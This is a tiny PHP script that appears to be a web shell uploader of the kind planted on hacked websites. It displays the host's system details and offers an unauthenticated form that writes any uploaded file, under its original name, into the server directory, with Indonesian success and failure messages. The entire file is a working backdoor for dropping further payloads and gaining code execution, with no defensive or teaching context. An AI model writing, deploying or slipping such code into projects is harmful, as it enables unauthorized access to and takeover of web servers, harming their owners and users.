<?php
echo '<b>Upload By Me <br><br>'.php_uname().'<br></b>';
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
	if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Berhasil for Me !!!</b><br><br>'; }
	else { echo '<b>Upss Gagal~!!</b><br><br>'; }
}
?>
